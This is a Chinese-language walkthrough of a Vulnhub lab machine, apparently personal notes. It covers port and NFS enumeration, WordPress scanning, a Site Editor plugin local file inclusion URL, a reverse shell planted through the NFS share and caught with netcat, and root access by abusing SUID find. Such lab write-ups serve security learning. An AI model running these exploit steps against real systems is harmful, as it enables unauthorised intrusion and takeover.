## 靶机信息
级别:中等++
禁用DHCP，静态IP 10.10.10.10

## Recon
```shell
sudo nmap -sT -p- --min-rate 10000 10.10.10.10 -oA tcp_scan/ports
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
443/tcp   open  https
2049/tcp  open  nfs
40931/tcp open  unknown
45659/tcp open  unknown
49583/tcp open  unknown
50579/tcp open  unknown
```

## nfs
```shell
showmount -e 10.10.10.10
/home/dpwwn02 (everyone)
kali改为host only之后mount nfs，共享的文件夹没有什么内容
```

## Web
![[Pasted image 20231014161400.png]]
### 目录爆破

```shell
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt
```
![[Pasted image 20231014161457.png]]

## wordpress
### 枚举
```shell
wpscan --url http://10.10.10.10/wordpress -e at -e ap -e u
```

![[Pasted image 20231014162448.png]]
看到插件信息
```shell
searchsploit site-editor 1.1.1
```
![[Pasted image 20231014162524.png]]
![[Pasted image 20231014162701.png]]

```shell
尝试进行利用
http://10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```
![[Pasted image 20231014162752.png]]
成功执行了/etc/passwd

## 通过LFI和nfs获取立足点
```shell
将reverse shell上传到mount的目录中
sudo cp /home/kali/Vulnhub/dpwwn2/shell.php .
nc -lvnp 1234
http://10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/home/dpwwn02/shell.php
得到立足点
```

## 提权
```shell
find / -type f -perm -u=s 2>/dev/null
/usr/bin/find

find . -exec chmod u+s /bin/bash \; -quit
bash -p 
```
![[Pasted image 20231014165201.png]]

